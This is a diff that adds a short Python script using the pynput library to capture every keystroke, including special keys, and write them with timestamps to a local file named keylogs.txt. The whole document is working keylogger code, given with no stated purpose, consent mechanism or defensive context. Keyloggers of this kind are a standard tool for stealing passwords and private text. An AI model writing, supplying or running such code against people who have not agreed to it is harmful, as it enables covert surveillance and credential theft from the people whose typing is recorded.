@@ -1,0 +1,18 @@
+from pynput.keyboard import Listener
+import logging
+
+# Set up logging to save keystrokes to a file
+log_file = "keylogs.txt"
+logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+def on_press(key):
+    try:
+        # Log the key pressed
+        logging.info(f"Key pressed: {key.char}")
+    except AttributeError:
+        # Handle special keys like Enter, Backspace, etc.
+        logging.info(f"Special key: {key}")
+
+# Set up the listener to detect keypresses
+with Listener(on_press=on_press) as listener:
+    listener.join()
